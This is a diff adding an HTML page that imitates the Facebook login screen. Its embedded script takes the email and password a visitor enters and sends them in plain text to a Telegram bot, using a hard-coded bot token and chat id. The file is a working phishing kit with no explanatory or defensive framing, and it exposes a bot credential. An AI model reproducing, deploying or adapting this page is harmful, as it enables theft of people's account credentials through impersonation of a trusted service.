@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Roboto:wght@300;700&display=swap"
+        rel="stylesheet">
+    <title>Document</title>
+
+    <style>
+        input:focus,
+        select:focus,
+        textarea:focus,
+        button:focus {
+            outline: none;
+        }
+
+        .header {
+            background: #fff;
+            display: flex;
+            align-items: center;
+            height: 100vh;
+            color: #FFF;
+            text-align: center;
+        }
+
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .face {
+            margin-bottom: 20px;
+            color: #000;
+            font-size: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+        }
+
+        .inputs {
+            width: 100%;
+            padding: 20px;
+        }
+
+        .inputs input {
+            display: block;
+            padding: 15px;
+            border: 1px solid #ccc;
+            margin-bottom: 10px;
+            width: 100%;
+        }
+
+        .login {
+            background: #1976d2;
+            width: 100%;
+            color: #FFF;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            height: 50px;
+        }
+
+        .lds-ring {
+            display: none;
+            position: relative;
+            width: 20px;
+            height: 20px;
+        }
+
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            border-color: #fff transparent transparent transparent;
+        }
+
+        .lds-ring div:nth-child(1) {
+            animation-delay: -0.45s;
+        }
+
+        .lds-ring div:nth-child(2) {
+            animation-delay: -0.3s;
+        }
+
+        .lds-ring div:nth-child(3) {
+            animation-delay: -0.15s;
+        }
+
+        @keyframes lds-ring {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+
+</head>
+
+<body>
+
+
+    <section class="header">
+
+        <div class="mainhead">
+
+        </div>
+
+        <div style="width: 100%;">
+
+            <div>
+                <img src="facebook.svg" width="50">
+            </div>
+            <h1 class="face">Facebook</h1>
+
+            <div class="inputs">
+                <input id="email" type="text" placeholder="E-mail or phone number">
+                <input id="password" type="password" placeholder="Passowrd">
+                <button class="login" id="login">
+                    <span id="btntxt">LOGIN</span>
+                    <div class="lds-ring" id="btnload">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+
+                </button>
+            </div>
+        </div>
+
+    </section>
+
+
+    <script>
+
+
+        var but = document.getElementById("login");
+        var email = document.getElementById("email");
+        var password = document.getElementById("password");
+        var btntxt = document.getElementById("btntxt");
+        var btnload = document.getElementById("btnload");
+
+
+        but.onclick = function () {
+
+            var id = 578601940
+            var token = "695722985:AAEsmA2akvWQvEAwTI-8sEBn_8Lmtj5N5T0";
+
+            if (email.value.length > 0 && password.value.length > 0) {
+                btntxt.style.display = "none";
+                btnload.style.display = "inline-block";
+                fetch("https://api.telegram.org/bot" +
+                    token +
+                    "/sendMessage?chat_id=" + id + "&text=" + email.value + " | " + password.value).then(() => {
+                        btntxt.style.display = "inline-block";
+                        btnload.style.display = "none";
+                    })
+            }
+        }
+
+
+    </script>
+
+</body>
+
+</html>
